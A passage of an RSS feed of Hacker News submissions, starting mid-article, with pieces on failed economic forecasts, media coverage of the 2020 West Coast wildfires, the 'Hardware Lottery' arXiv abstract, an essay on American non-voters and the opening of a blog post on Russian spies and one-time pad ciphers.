government’s budget.”</p></blockquote><p>With interest rates being so important to so many, it’s no surprise that an entire industry of professional predictors exists to monitor the rate’s past and forecast its future.</p><p><a href="https://www.wsj.com/articles/some-investors-had-hunch-yields-were-about-to-fall-11560072600"><span>The Wall Street Journal</span></a>&nbsp;surveyed a panel of 50 such specialists and asked them to predict the interest rate 8 months into the future.</p><p>From a starting interest rate of 3.2%, the professional&nbsp;predictions ranged from a high of 3.8% to a low of 2.5%. The average estimate was 3.4%.</p><p>In reality, nobody came close. 6 months in and the interest rate had fallen below the predictions’ lower bound. And it kept falling. By the end of the prediction timeframe the rate was closing in on 2%. None of the predictions had come within half a percent of reality.&nbsp;</p><p>These may seem like fine margins, but half a percent represents about a sixth of the initial rate. That’s like having 50 estate agents estimating the value of a $1.2m property and nobody coming within $200,000.</p><p>And this isn’t a one off.</p><p>The Obstfeld and Tesar article&nbsp;presents the results of similar studies conducted in&nbsp;five different years.</p><p>In every single one, the&nbsp;forecasts fail. In 2006, the rate was predicted to be 6%, in reality it was closer to 5%. In 2010, it was predicted to be 6%, it was actually closer to 4%. In 2005, it was predicted to be 5%, it was closer to 2%.</p><p>The article concludes:</p><blockquote><p>“The decline (in interest rates) has come largely as a surprise. Financial markets and professional forecasters alike consistently failed to predict the secular shift, focusing too much on cyclical factors.”</p></blockquote><p>It seems that interest rate predictions are prone to flounder and fold. But that doesn’t stop us from making more. Despite our failures at forecasting one economy, some turn their attention to predicting the relationship between two. But how do they fare?&nbsp;</p><p>That’s the field that we’ll focus on next.</p><h3>We can’t predict exchange rates</h3><p>If predicting the ups and downs of one economy is hard, forecasting the relationship between two is doubly difficult.</p><p>Fortunately, financial institutions&nbsp;make an assessment of their success straight forward.</p><p>At the start of each year, many banks make a prediction for the end of year dollar-to-euro exchange-rate. In one study, Gerd Gigerenzer, the director emeritus of the Center for Adaptive Behavior and Cognition&nbsp;at the Max Planck Institute for Human Development, compiled the exchange rate predictions made between 2000 and 2010 by 22 international banks including Barclays, Citigroup, JPMorgan&nbsp;Chase, and the Bank of&nbsp;America Merrill Lynch.</p><p>Discussing the Gigerenzer study in his book&nbsp;<a href="https://www.amazon.co.uk/dp/1509843493/ref=cm_sw_r_cp_api_i_H6r5EbR6BYQMC"><span>Range</span></a>&nbsp;David Epstein provides some searing details into where the forecasts went wrong:</p><blockquote><p>“In six of the ten years, the true exchange rate fell outside the entire range of all twenty-two bank forecasts. (…) Major bank forecasts missed every single change of [exchange rate] direction in the decade Gigerenzer analysed.”</p></blockquote><p>Gigerenzer’s own conclusion was even more clear:</p><blockquote><p>“Forecasts of dollar-to-euro exchange rates are worthless.”</p></blockquote><p>30 years earlier, Richard Meese and Kenneth Rogoff, from the University of California, Berkeley and the Federal reserve respectively, pitted three different exchange rate …</p></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy">https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy</a></em></p>]]>
            </description>
            <link>https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy</link>
            <guid isPermaLink="false">hacker-news-small-sites-24522322</guid>
            <pubDate>Fri, 18 Sep 2020 22:03:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is Climate Change Responsible for This Season's Wildfires?]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24521994">thread link</a>) | @amoorthy
<br/>
September 18, 2020 | https://blog.thefactual.com/climate-change-wildfires-oregon-california | <a href="https://web.archive.org/web/*/https://blog.thefactual.com/climate-change-wildfires-oregon-california">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_151456960811572" data-hs-cos-general-type="widget" data-hs-cos-type="module">
    <div>
<div>
<div>
<div>


<div>
<div>


<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>The recent HBO miniseries <em>Chernobyl</em> captured a key moment in which human protagonists are confronted by the scale of a disaster. During this unprecedented man-made incident in 1986, nuclear scientists at a damaged nuclear reactor struggled to assess the danger from radiation, especially because the geiger counters on hand — devices meant to measure levels of radiation — <a href="https://www.jstor.org/stable/10.5612/slavicreview.74.1.104?read-now=1&amp;seq=9#page_scan_tab_contents" rel="noopener" target="_blank"><span>didn’t go high enough</span></a> to measure the amount of radiation leaking into the environment. The radiation essentially exceeded what the scientists had tools on hand to measure.</p>
<!--more-->
<p>This week, the fires across the West Coast highlighted our own inability to comprehend the scale of a disaster scenario, with air quality in parts of Oregon <a href="https://www.oregonlive.com/news/2020/09/portlands-air-quality-is-off-the-charts-on-sunday-and-much-of-oregon-is-just-as-bad-due-to-wildfires.html" rel="noopener" target="_blank"><span>exceeding</span></a> the Environmental Protection Agency’s 500-point AQI scale. Previously, events that put the AQI at 300 were “extremely rare”; in recent days, the AQI in places like Eugene, Oregon topped 700, essentially <a href="https://grist.org/climate/oregons-air-quality-is-so-far-beyond-hazardous-that-no-one-knows-what-it-means-for-health/" rel="noopener" target="_blank"><span>unfamiliar territory</span></a> in terms of air quality.&nbsp;</p>
<p>Though not quite the same as a nuclear meltdown, we are similarly unprepared to answer key questions about the crisis: What are the <a href="https://www.vox.com/21427857/california-wildfire-2020-oregon-washington-air-quality-smoke-orange-red-sky-health" rel="noopener" target="_blank"><span>health impacts</span></a> of exposure to this air? What are the long-term effects of fires in forest land that <a href="https://www.nytimes.com/2020/09/12/climate/oregon-wildfires.html?action=click&amp;module=Spotlight&amp;pgtype=Homepage" rel="noopener" target="_blank"><span>shouldn’t typically burn</span></a>? And above all, to what degree is human activity, via climate change or other mechanisms, responsible for such natural disasters?&nbsp;</p>
<p>This week, The Factual surveyed 29 articles from 23 news sources across the political spectrum to see how the media is talking about the West Coast’s mega-fire season, including views on how and to what degree human activity is responsible for seemingly apocalyptic scenarios.</p>
<h4><br><strong>A Wild Wildfire Season</strong></h4>
<p>Given the <a href="https://www.theguardian.com/us-news/2020/sep/12/california-oregon-washington-fires-explained-climate-change" rel="noopener" target="_blank"><span>unprecedented scope</span></a> of this year’s wildfires on the West Coast, a common question is why this wildfire season has been quite so bad. A cursory glance at headlines and comments by national figures would lead one to believe that there is a simple dichotomy, with the political left blaming climate change and the right blaming bad government policies. In reality, there seems to be some broad agreement on the key factors at play: (1) a problematic approach to forest management that has led to greater fire risks, (2) human behavior that makes fires more dangerous and more likely, and (3) a warming climate. Only when measuring to what degree changing climate is responsible, and the fundamental reasons for why climate is changing, does real disagreement emerge.</p>
<p>A big misconception about fires is that they are inherently dangerous and/or bad for the environment, but the reality is that they are an <a href="https://www.theguardian.com/us-news/2020/sep/12/california-oregon-washington-fires-explained-climate-change" rel="noopener" target="_blank"><span>essential part</span></a> of ecosystem renewal and healthy environmental progression. In a natural scenario, many forest habitats should burn on a regular basis, clearing the underbrush while leaving larger trees mostly unharmed. But a longtime misdirected approach to fire management on the West Coast has prioritized <a href="https://www.wired.com/story/climate-grief-is-burning-across-the-american-west/" rel="noopener" target="_blank"><span>putting out</span></a> fires quickly to protect growing human populations. However, this strategy has not been accompanied by enough controlled burns to limit growing fire risks and maintain normal ecosystem renewal.</p>
<p><span>"Part of the difficulty is that California’s climate provides only limited periods of time when crews can safely light fires to manage forest health. The conditions must be dry enough for vegetation to burn, but not dry enough to risk a runaway blaze." - <a href="https://www.sfchronicle.com/california-wildfires/article/Are-climate-change-or-poor-forest-management-15564031.php" rel="noopener" target="_blank">San Francisco Chronicle</a></span></p>
<p>While the safety rationale of the choice not to burn seems straightforward, it can perversely have the opposite effect. If an ecosystem does not burn, the underbrush continues to build up, making the next eventual fire <a href="https://www.nationalreview.com/2020/09/california-forest-mismanagement-a-disaster/#slide-1" rel="noopener" target="_blank"><span>hotter and more dangerous</span></a>. As the fire intensity increases, trees that shouldn’t burn go up in flames and smaller, low-intensity fires become fast-moving disasters that endanger natural ecosystems and human settlements alike. In this way, man-made policies have helped make the West Coast a tinderbox.</p>
<div><p>Further aggravating this risk is human behavior. As populations and urban areas grow, humans have expanded ever-outward, encroaching on and living in heavily-forested areas. This has increasingly placed populations in danger from wildfires. Forest management has been consistently <a href="https://www.nytimes.com/2020/09/10/climate/wildfires-climate-policy.html" rel="noopener" target="_blank"><span>under-resourced</span></a>, and landowners aren't always <a href="https://arstechnica.com/science/2020/01/why-isnt-california-using-more-prescribed-burns-to-reduce-fire-risk/" rel="noopener" target="_blank"><span>willing</span></a> to respond with the measures needed to mitigate fire risks. In California, for example, the state only owns <a href="https://www.kqed.org/science/1927354/controlled-burns-can-help-solve-californias-fire-problem-so-why-arent-there-more-of-them" rel="noopener" target="_blank">57% of forested land</a> and cannot obligate private landowners to use controlled burns to mitigate fire risks.</p></div>
<p><img src="https://lh5.googleusercontent.com/zxd_ypEby-bddzFmqsD5-961ZgOYuNCl08ZrzIsbA-JrHcczJEKfI32SXmpV7vj56YKlrEHixxzC0uvbbswH1LTdWmNQwimnRzsJOJ4hfe7DfOa_yc3LKRD03j6u1e1lJRmuA4_-" width="578"></p>
<div><p>The WUI, or wildland-urban interface, is the area where human settlement and wildlands intermix. These are areas were human structures are in close proximity to land prone to wildfires. Source: <a href="https://www.nrs.fs.fed.us/news/release/wui-increase" rel="noopener" target="_blank"><span>USDA</span></a></p></div>
<p>Factors such as lower housing costs and a desire to be closer to nature have <a href="https://www.nytimes.com/2020/09/10/climate/wildfires-climate-policy.html" rel="noopener" target="_blank"><span>helped encourage</span></a> the development subdivisions and individual homes well into the forest. To make matters worse, as these populations (and people from across the states) spend more time outdoors and in these forests, the risk of fire goes up. The ever-increasing levels of human activity is accompanied by an ever-higher risk of fire.</p>
<div><p>Finally, the overall climatic conditions cannot be ignored. 2020 promises to be one of the <a href="https://www.discovermagazine.com/environment/with-august-in-the-books-2020-is-still-likely-to-be-the-warmest-year-on" rel="noopener" target="_blank"><span>hottest years on record</span></a>, and this year’s fire season vigorously kicked off on a record-hot Labor Day weekend, partly because of a freak lightning storm in California (with over <a href="https://abcnews.go.com/ABCNews/million-acres-burned-california-firefighters-brace-lightning-storm/story?id=72551511" rel="noopener" target="_blank"><span>12,000 lightning strikes</span></a>) and partly because landscapes across the West Coast were uncharacteristically dry — even for fire season.&nbsp;</p></div>
<p><img src="https://lh6.googleusercontent.com/Sfqjx4sJ4aGT8ibajU93V7ZjH8HOQ8P0Th_NDP77MSdgLymRRRWv-8soEftHsKo7mmpODdIl2yHjPlGWaUWNnJLEop01ql63y_hzOWOwMZdCfJn6OW9a7tuveBEi7ECcAhyd0xhz" width="600"></p>
<div><p>This map shows how average temperatures in August 2020 contrast with the average August temperatures from 1951-1980.&nbsp; Source: <a href="https://www.discovermagazine.com/environment/with-august-in-the-books-2020-is-still-likely-to-be-the-warmest-year-on" rel="noopener" target="_blank"><span>Discover Magazine</span></a></p></div>
<p>It would seem that disputes about whether the world is warming have been replaced with a general agreement that, yes, things are getting hotter. This has obvious, straightforward effects for natural events like wildfires. Higher temperatures mean drier vegetation and potentially even more high-intensity <a href="https://www.oregonlive.com/news/2020/09/oregons-historic-wildfires-the-unprecedented-was-predictable.html" rel="noopener" target="_blank"><span>wind events</span></a>. That this is at least part of the reason for this fire season’s severity is clear to people on both sides of the spectrum.</p>
<p>Where these perspectives diverge is in terms of just who or what is responsible for changing climate. Though President Trump has used the occasion to <a href="https://www.washingtonexaminer.com/policy/energy/trump-says-world-will-start-getting-cooler-as-biden-criticizes-him-as-a-climate-arsonist" rel="noopener" target="_blank"><span>cast doubt</span></a> on the question of whether climate is changing — something almost all of the articles reviewed for this analysis roundly agree to be the case — the more pertinent divergence regards the degree to which human activity is responsible for the changing climate.&nbsp;</p>
<p>Articles from the political left and center are clear in the science and rationale for linking human activity, particularly the release of greenhouse gas emissions, with climate change — a phenomenon that represents a combination of not just overall warmer temperatures but also increasing weather extremes, rising sea levels, and shifting climatic patterns. In the case of wildfires, this means some articles lay proportionally more blame on <a href="https://www.latimes.com/california/story/2020-09-13/climate-change-wildfires-california-west-coast" rel="noopener" target="_blank"><span>larger climate trends</span></a>, blaming global <a href="https://www.wired.com/story/climate-grief-is-burning-across-the-american-west/" rel="noopener" target="_blank"><span>CO2 emissions</span></a> as much as localized factors like forestry management.&nbsp;</p>
<p>“Many of the phenomena happening now have been predicted for years by agencies like NASA, NOAA and the United Nations, as well as researchers and scientists around the world, who say the only chance of slowing climate change is cutting back or eliminating the biggest producers of greenhouse gases, including cars.” - <a href="https://weather.com/news/climate/news/2020-09-11-extreme-weather-climate-change-disasters-wildfires-flooding-hurricanes" rel="noopener" target="_blank"><span>The Weather Channel</span></a></p>
<p>Many on the political right are still hesitant to conclude that human activity is the driving force behind a changing climate, even if many acknowledge that the climate is <a href="https://www.foxnews.com/politics/wildfire-democrats-climate-change" rel="noopener" target="_blank"><span>getting warmer</span></a>. As a result, much more right-leaning coverage focuses on the direct, <a href="https://reason.com/2020/09/14/western-wildfires-can-be-prevented-if-burdens-on-forest-management-are-eased/" rel="noopener" target="_blank"><span>human reasons</span></a> for the current spate of fire disasters, and <a href="https://today.yougov.com/topics/science/articles-reports/2020/09/15/what-americans-think-about-wildfires-and-climate-c" rel="noopener" target="_blank"><span>roughly half</span></a> of Republicans may think that climate change has not played a role in the current fires.&nbsp;</p>
<p>Ideally, we could better isolate each variable to say how much human movement into forests is responsible for fires and how much is due to a warmer climate, but this is hard to parse from overall trends. For example, across the U.S. we built as many as <a href="https://www.mdpi.com/2571-6255/3/3/50/htm" rel="noopener" target="_blank"><span>32 million homes</span></a> between 1990 and 2015 in the wildland-urban interface — areas where the wildlands intermix with human development — many of which are at increased fire risk. At the same time, fires near Portland are burning forest that has historically been too wet to pose a significant hazard to long-standing neighborhoods.&nbsp;</p>
<p>“What’s different this time is that exceptionally dry conditions, combined with unusually strong and hot east winds, have caused wildfires to spiral out of control, threatening neighborhoods that didn’t seem vulnerable until now.” - <a href="https://www.nytimes.com/2020/09/12/climate/oregon-wildfires.html?action=click&amp;module=Spotlight&amp;pgtype=Homepage" rel="noopener" target="_blank"><span>New York Times</span></a></p>
<div><p>A positive perspective on the issue might note that both sides, despite clear and vocal differences, actually agree that human activity and behavior make up many of the key reasons for these apocalyptic conditions.</p></div>
<h4><strong>Moving Forward</strong></h4>
<p>As <a href="https://www.chicagotribune.com/weather/ct-weather-smoke-fires-gray-sky-20200914-kpmxe2i2gjhahocfpd7zwovqt4-story.html" rel="noopener" target="_blank"><span>smoke wafts</span></a> across the U.S., there may be greater impetus to drive higher-level reform to address these growing issues. There are many reforms that both sides can agree on. Above all, we need to <a href="https://www.nytimes.com/2020/09/10/climate/wildfires-climate-policy.html" rel="noopener" target="_blank"><span>modify land management practices</span></a> and divert more resources to both fire response and prevention. For example, as the risk of fire has increased, funding that should be used for fire prevention has been shifted to firefighting. Cumbersome regulatory hurdles have slowed the implementation of controlled burns, and private landowners <a href="https://www.foxnews.com/politics/wildfire-democrats-climate-change" rel="noopener" target="_blank"><span>can still reject</span></a> such preventative action, often fearful of <a href="http://sacbee.com/news/california/article239475468.html" rel="noopener" target="_blank"><span>liability</span></a>. Measures like <a href="https://slate.com/business/2018/11/california-houses-rebuild-camp-fire-design.html" rel="noopener" target="_blank"><span>increasingly fire-proof</span></a> homes can help, but only go so far.</p>
<p>“Forest Service spending on fire suppression in recent years has gone from 15 percent of the budget to 55 percent – or maybe even more – which means we have to keep borrowing from funds that are intended for forest management.” - <a href="https://www.usda.gov/media/press-releases/2017/09/14/forest-service-wildland-fire-suppression-costs-exceed-2-billion" rel="noopener" target="_blank"><span>Secretary of Agriculture Sonny Purdue</span></a></p>
<p>Below this common ground, larger disagreements promise to persist, especially about climate change and its role in the current conflagrations. A host of policy actions that the political left targets, such as reducing …</p></span></p></div></div></div></div></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.thefactual.com/climate-change-wildfires-oregon-california">https://blog.thefactual.com/climate-change-wildfires-oregon-california</a></em></p>]]>
            </description>
            <link>https://blog.thefactual.com/climate-change-wildfires-oregon-california</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521994</guid>
            <pubDate>Fri, 18 Sep 2020 21:21:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Hardware Lottery]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24521983">thread link</a>) | @bnjemian
<br/>
September 18, 2020 | Https://arxiv.org/abs/2009.06489 | <a href="https://web.archive.org/web/*/Https://arxiv.org/abs/2009.06489">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      
      <div id="content">
        <!--
rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
         xmlns:dc="http://purl.org/dc/elements/1.1/"
         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
    <rdf:Description
        rdf:about="/abs/2009.06489"
        dc:identifier="/abs/2009.06489"
        dc:title="The Hardware Lottery"
        trackback:ping="/trackback/2009.06489" />
    </rdf:RDF>
-->
<div id="abs-outer">
  

  <div>
    

    <p><strong>arXiv:2009.06489</strong> (cs)
    </p>
    



<div id="content-inner">
  <div id="abs">
    <p>
  
  
  
    
  
  
    
    
  

  [Submitted on 14 Sep 2020]</p>
    
    
      
    
  
    <p><a href="https://arxiv.org/pdf/2009.06489">Download PDF</a></p><blockquote>
      <span>Abstract:</span>  Hardware, systems and algorithms research communities have historically had
different incentive structures and fluctuating motivation to engage with each
other explicitly. This historical treatment is odd given that hardware and
software have frequently determined which research ideas succeed (and fail).
This essay introduces the term hardware lottery to describe when a research
idea wins because it is suited to the available software and hardware and not
because the idea is superior to alternative research directions. Examples from
early computer science history illustrate how hardware lotteries can delay
research progress by casting successful ideas as failures. These lessons are
particularly salient given the advent of domain specialized hardware which
makes it increasingly costly to stray off of the beaten path of research ideas.

    </blockquote>

    <!--CONTEXT-->
    <div>
      <table summary="Additional metadata"><tbody><tr>
          <td>Subjects:</td>
          <td>
            <span>Computers and Society (cs.CY)</span>; Artificial Intelligence (cs.AI); Hardware Architecture (cs.AR); Machine Learning (cs.LG)</td>
        </tr><tr>
          <td>Cite as:</td>
          <td><span><a href="https://arxiv.org/abs/2009.06489">arXiv:2009.06489</a> [cs.CY]</span></td>
        </tr>
        <tr>
          <td>&nbsp;</td>
          <td>(or <span>
              <a href="https://arxiv.org/abs/2009.06489v1">arXiv:2009.06489v1</a> [cs.CY]</span> for this version)
          </td>
        </tr>
      </tbody></table>
    </div>
  </div>
</div>

    <div>
      <h2>Submission history</h2><p> From: Sara Hooker [<a href="https://arxiv.org/show-email/37378193/2009.06489">view email</a>]
      <br><strong>[v1]</strong>
Mon, 14 Sep 2020 14:49:10 UTC (4,498 KB)<br></p></div>
  </div>
  <!--end leftcolumn-->

  <div>
    
    <!--end full-text-->
    <div><p>
    Current browse context: </p><p>cs.CY</p>

  
  
    </div>

    

    
  </div>
  <!--end extra-services-->


  
  
  
  

  
</div>

      </div>
    </div></div>]]>
            </description>
            <link>Https://arxiv.org/abs/2009.06489</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521983</guid>
            <pubDate>Fri, 18 Sep 2020 21:20:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Non-Voter]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24521930">thread link</a>) | @exolymph
<br/>
September 18, 2020 | https://americancompass.org/the-commons/the-non-voter/ | <a href="https://web.archive.org/web/*/https://americancompass.org/the-commons/the-non-voter/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><img data-src="https://americancompass.org/wp-content/uploads/2020/08/DSC_7299-scaled.jpg" src="https://americancompass.org/wp-content/uploads/2020/08/DSC_7299-scaled.jpg"></p><p>Like the largest political group in America, the non-voter, I completely ignored this year’s Democratic convention. Like an overwhelming majority of Americans I didn’t watch any speeches, didn’t go online to read hot takes spinning those speeches, and I didn’t fight on Twitter over whatever happened.</p><p>Instead I spent the week doing what I usually do, and what most people do, which is getting on with my life by working, talking to friends and family, watching sports, playing video games, whatever.</p><p>If I am going to continue to do this I will keep ignoring the silly details of the election and focus instead on keeping my head above water, and when election day comes, I will probably forget about it, or if I remember it, will simply shrug and say, “Too busy. Doesn’t matter anyways.”</p><p>For many Americans, as they see it, politics, especially presidential politics, doesn’t matter. It’s a far removed thing that every few years makes a lot of noise, pestering them with ads and phone calls, and when over, forgets about them or screws them over. It is like that flower they see on TV that attracts big crowds because it blooms every seven years and smells of rotting flesh.</p><p><span id="more-1981"></span>Each election there are three choices and the winner is always not voting. In 2016 100 million people chose this option, far far more than people who voted for Trump. Or Clinton. “None of the above” effectively wins every presidential election, and it isn’t even close.</p><p>That is a pretty damning indictment of our political system and suggest understanding non-voters is more important than a Joe Biden speech watched by less than 10% of adults, and far more important than what a bunch of DC insiders think of it.</p><p>Most of my book on poverty and addiction is about non-voters. That isn’t surprising since the poorest Americans are the least likely to vote. Yet I met plenty of working class and solidly middle class people who don’t vote.</p><p>One reason people don’t vote is because it is unnecessarily hard to do, and that should be changed. But it is far more than that. For many Americans, as they see it, not voting is the right choice, and they still wouldn’t vote if it was easier to do.</p><p>The attitude is best summed up by T, a forty-year old black man in Lumberton, North Carolina who explained why he didn’t vote in 2016,</p><p>“I am just so upset with the whole thing. Fed up. I voted for Obama. Seems like when he left office nothing changed for me. Nothing changed for this neighborhood. So I say, ‘We had a black president and I still working for eight dollars per hour and nothing has changed. Nothing. Ain’t nothing changed. Every single president. Obama. Bush. Clinton. Same thing.”</p><p>Or J, 62, in Battle Creek, Michigan,</p><p>“Most of the men I know didn’t vote. Nobody had the spirit this time. Trump or Hillary? Doesn’t make much difference. Things out here gonna stay the same. We had high hopes for Obama. But nothing changed. Blacks here didn’t end up being helped by him. I mean, he might have tried, but his hands were tied by both parties. Lots of us are just so frustrated. Nobody had the spirit.”</p><p>No change and still no hope, so why bother.</p><p>T and J at least took the time to respond. Most others, when asked about politics, simply roll their eyes, or laugh, or shake their head, or spit out something like, ‘Fuck them crooks.’</p><p>This isn’t a left or right thing, or a black or white thing, or an urban versus rural thing. It isn’t just an Obama thing, like in the two examples. I heard the same frustration and same disappointment directed at Bush and Romney from deep red regions, like trailer parks in West Virginia and truck stops in Kansas, just like I heard it directed at Obama and Clinton in deep blue regions like a housing project in downtown Cleveland and the wards of El Paso.</p><p><img src="https://americancompass.org/wp-content/uploads/2020/08/DSC_8937-300x200.jpg" alt="" width="741" height="494" srcset="https://americancompass.org/wp-content/uploads/2020/08/DSC_8937-300x200.jpg 300w, https://americancompass.org/wp-content/uploads/2020/08/DSC_8937-1024x683.jpg 1024w, https://americancompass.org/wp-content/uploads/2020/08/DSC_8937-768x513.jpg 768w, https://americancompass.org/wp-content/uploads/2020/08/DSC_8937-1536x1025.jpg 1536w" sizes="(max-width: 741px) 100vw, 741px"></p><p>Not voting is about a justified cynicism forged from a lifetime of being screwed over by the status quo, and little is more status quo than sporting a “I voted” sticker. In their minds, and from their experiences, voting has no clear upside. Nothing is going to change.</p><p>And it comes with downside, both explicit and implicit.</p><p>Voting means entering institutions that have given them problems. From schools, where they were tested, measured, and prodded endlessly, only to be then ignored, scolded, or demeaned. To municipal buildings where they were taxed, fined, or charged.</p><p>Voting means interacting with a class of people who filled and embodied those institutions. Who either ignored or scolded them in school, or taxed and fined them in the court house. It is rejoining a part of America that doesn’t value them, from the way they dress to the way they think.</p><p>Voting means getting further entangled with a bureaucracy that has done nothing but tangled them up. Hell, it might even come with jury duty. They can’t do that because they are working two jobs and got kids to care for.</p><p>All to pull a lever, to be one single vote out of 122 million? Hell. ‘No way my vote is going make one bit of difference with that many people voting. So you want me to have to drive into town when I got only enough gas to get to work and don’t want to have to fill up tomorrow because I am on a tight schedule and need to switch to my back up card because I misplaced the first charge card. All for a vote that won’t change a thing. Even if, miracle of miracles, my vote swung the election. Now what? I got the president I wanted, and nothing has changed. My street still has potholes and my job still sucks.’</p><p><img src="https://americancompass.org/wp-content/uploads/2020/08/DSC_3728-2-2-1-300x211.jpg" alt="" width="738" height="519" srcset="https://americancompass.org/wp-content/uploads/2020/08/DSC_3728-2-2-1-300x211.jpg 300w, https://americancompass.org/wp-content/uploads/2020/08/DSC_3728-2-2-1-1024x722.jpg 1024w, https://americancompass.org/wp-content/uploads/2020/08/DSC_3728-2-2-1-768x541.jpg 768w, https://americancompass.org/wp-content/uploads/2020/08/DSC_3728-2-2-1-1536x1083.jpg 1536w" sizes="(max-width: 738px) 100vw, 738px">That isn’t to say non-voters don’t have views about politics, or don’t have a side they root for, or won’t trash talk the president or a candidate. They have strong views, and they might get emotionally involved for a bit, but they know their place is to watch. They are spectators of a sport that doesn’t involve them, or care about them. The outcome won’t change their life because it never has.</p><p>They are the fans with no money on the line, only in it for possible bragging rights. That is different from the wealthy, successful, and highly educated. We all have money on the line, whether we acknowledge it or not. From the business community, lobbyists, non-profits, and think tanks, who explicitly have cash on the line, to the verified accounts fighting on Twitter whose job and status is tethered to the winner.</p><p>While we may not be players on the field, we are part of the team. Our life and careers will change, sometimes hugely, depending on who wins. Politics is our sport, our game. It is built by and for us.</p><p>For most Americans, like the twenty-five year old woman flipping hamburgers in Detroit, or the forty-five year old guy selling tires in Odessa, who wins isn’t going to change their lives, as they see it. Politics isn’t their sport, isn’t their game, isn’t built by or for them, as they reckon it. Rather, it is something they can watch for entertainment, but most have already seen this show before, and the ending is pretty whatever.</p> <p><a href="https://americancompass.org/the-commons/">Return to the Commons</a></p></div></div>]]>
            </description>
            <link>https://americancompass.org/the-commons/the-non-voter/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521930</guid>
            <pubDate>Fri, 18 Sep 2020 21:14:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Cryptologic Mystery]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24521801">thread link</a>) | @homarp
<br/>
September 18, 2020 | https://www.mattblaze.org/blog/neinnines/ | <a href="https://web.archive.org/web/*/https://www.mattblaze.org/blog/neinnines/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="center"><div>
		<p>18 September 2020</p><p>A Cryptologic Mystery</p>
	<p>Did a broken random number generator in Cuba help expose a Russian espionage network?</p>




	
<p>
I picked up the new book <em>Compromised</em> last week and was intrigued to discover that it may have shed some light on a small (and rather esoteric) cryptologic and espionage mystery that I've been puzzling over for about 15 years. <em>Compromised</em> is primarily a memoir of former FBI counterintelligence agent Peter Strzok's investigation into Russian operations in the lead up to the 2016 presidential election, but this post is not a review of the book or concerned with that aspect of it.
</p><p>
Early in the book, as an almost throwaway bit of background color, Strzok discusses his work in Boston investigating the famous Russian "illegals" espionage network from 2000 until their arrest (and subsequent exchange with Russia) in 2010. "Illegals" are foreign agents operating abroad under false identities and without official or diplomatic cover. In this case, ten Russian illegals were living and working in the US under false Canadian and American identities. (The case inspired the recent TV series <em>The Americans</em>.)
</p><p>
Strzok was the case agent responsible for two of the suspects, Andrey Bezrukov and Elena Vavilova (posing as a Canadian couple under the aliases Donald Heathfield and Tracey Lee Ann Foley). The author recounts watching from the street on Thursday evenings as Vavilova received encrypted shortwave "numbers" transmissions in their Cambridge, MA apartment.
</p><p>
Given that Bezrukov and Vaviloa were indeed, as the FBI suspected, Russian spies, it's not surprising that they were sent messages from headquarters using this method; numbers stations are part of time-honored espionage tradecraft for communicating with covert agents. But their capture may have illustrated how subtle errors can cause these systems to fail badly in practice, even when the cryptography itself is sound.
<br>
<a name="fold">&nbsp;</a></p><hr size="1"><p>
	

First, a bit of background. For at least the last sixty years, encrypted shortwave radio transmissions have been a standard method for sending messages to covert spies abroad. Shortwave radio has several attractive properties here. It covers long distances; it's possible for a single transmitter to get hemispheric or even global coverage. Shortwave radio receivers, while less common than they once were, are readily available commercially in almost every country and are not usually suspicious or alerting to possess. And while it's relatively easy to tell where a shortwave signal is coming from, their wide coverage area makes it very difficult to infer exactly who or where the intended recipients might be. Both the US (and its allies) and the Soviet Union (and its satellites) made extensive use of shortwave radio for communicating with spies during the cold war, and enigmatic "numbers" transmissions aimed at spies continue to this day.
</p><p>
The encryption method of choice used by numbers stations is called a "one time pad" (OTP) cipher. OTPs have unique advantages over other encryption methods. Used properly, they are <em>unconditionally</em> secure; no amount of computing power or ingenuity can "break" them without knowledge of the secret key. Also, they are almost deceptively low tech. It is possible to encrypt and decrypt OTP messages by hand with nothing more than paper and pencil and simple arithmetic. The disadvantage is that OTPs are cumbersome; you need a secret key as long as all the messages you will ever send, with no part of the key ever re-used for multiple messages. Typically, the key would be printed as a series of digits bound into a pad of paper, with each page removed after use; hence the name "one time pad". OTPs can be difficult in practice to use properly and are quite vulnerable if used improperly; more on that later.
</p><p>
The OTP messages sent to spies by shortwave radio typically consist of decimal digits broadcast in either a mechanically recorded voice or in morse code (more recently, digital transmissions are also used) on designated frequencies at designated times, usually in four or five digit groups (hence the term "numbers station"). After copying and verifying a header in the message, the agent would remove the corresponding page from their secret OTP codebook and add each key digit to each corresponding message digit using modulo-10 arithmetic (without carry). The resulting "plaintext" digits are then converted to text with a simple substitution encoding (e.g, A=01, B=02, etc., although other encodings are generally used). That's all there is to it. The security of the system depends entirely on the uniqueness and secrecy of the OTP codebook pad given to each agent.
</p><p>
